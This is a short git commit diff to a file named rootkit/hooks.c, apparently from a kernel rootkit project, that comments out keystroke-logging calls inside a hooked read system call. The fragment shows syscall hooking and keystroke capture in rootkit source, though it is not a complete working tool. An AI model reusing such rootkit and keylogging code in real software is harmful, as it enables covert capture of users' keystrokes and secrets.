9ad00409695433f27d38e8a3a894df0941e87437
Hooplahaha <josephschirato@gmail.com>
2018-10-21 13:07:01 +1100

    ?

--- rootkit/hooks.c
+++ rootkit/hooks.c
@@ -199,15 +199,11 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 
 	printf("%c", buf[0]);
 
-	int testfd = 0;
+	// int testfd = 0;
 
-	filewriter_openlog(curthread, &testfd, KEYSTROKE);
+	// filewriter_openlog(curthread, &testfd, KEYSTROKE);
 	
-	filewriter_closelog(curthread, testfd);	
-
-	
-	
-
+	// filewriter_closelog(curthread, testfd);	
 
 	
 
